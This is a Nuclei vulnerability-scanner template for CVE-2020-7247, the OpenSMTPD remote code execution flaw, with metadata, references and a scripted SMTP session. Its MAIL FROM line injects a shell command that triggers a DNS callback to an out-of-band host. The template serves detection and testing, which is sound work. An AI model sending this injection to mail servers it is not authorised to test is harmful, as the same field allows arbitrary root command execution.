id: CVE-2020-7247

info:
  name: OpenSMTPD 6.4.0-6.6.1 - Remote Code Execution
  author: princechaddha
  severity: critical
  description: |
    OpenSMTPD versions 6.4.0 - 6.6.1 are susceptible to remote code execution. smtp_mailaddr in smtp_session.c in OpenSMTPD 6.6, as used in OpenBSD 6.6 and other products, allows remote attackers to execute arbitrary commands as root via a crafted SMTP session, as demonstrated by shell metacharacters in a MAIL FROM field. This affects the "uncommented" default configuration. The issue exists because of an incorrect return value upon failure of input validation.
  impact: |
    Successful exploitation of this vulnerability allows an attacker to execute arbitrary code with the privileges of the OpenSMTPD process, potentially leading to a complete compromise of the affected system.
  remediation: OpenBSD users are recommended to install patches for OpenBSD 6.6
  reference:
    - https://www.openwall.com/lists/oss-security/2020/01/28/3
    - https://nvd.nist.gov/vuln/detail/CVE-2020-7247
    - https://github.com/openbsd/src/commit/9dcfda045474d8903224d175907bfc29761dcb45
    - http://www.openwall.com/lists/oss-security/2020/01/28/3
    - http://packetstormsecurity.com/files/156145/OpenSMTPD-6.6.2-Remote-Code-Execution.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-7247
    cwe-id: CWE-755
    epss-score: 0.97504
    epss-percentile: 0.9998
    cpe: cpe:2.3:a:openbsd:opensmtpd:6.6:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: openbsd
    product: opensmtpd
  tags: packetstorm,cve,cve2020,smtp,opensmtpd,network,rce,oast,kev

tcp:
  - host:
      - "{{Hostname}}"
      - "{{Host}}:25"
    inputs:
      - read: 1024

      - data: "helo target\r\n"
        read: 1024

      - data: "MAIL FROM:<;nslookup {{interactsh-url}};>\r\n"
        read: 1024

      - data: "RCPT TO:<root>\r\n"
        read: 1024

      - data: "DATA\r\n"
        read: 1024

      - data: "\r\nxxxx\r\n.\r\n"
        read: 1024

      - data: "QUIT\r\n"
        read: 1024

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: raw
        words:
          - "Message accepted for delivery"
# digest: 4b0a00483046022100a834285340d9fc7acaf100ad14766d6adfd2ff489823f5fde80bb6473bc21264022100e207f6f687ca7a0fd11f16a4f480efd6da72c847fa681dc3b687feb3ad786fe2:922c64590222798bb761d5b6d8e72950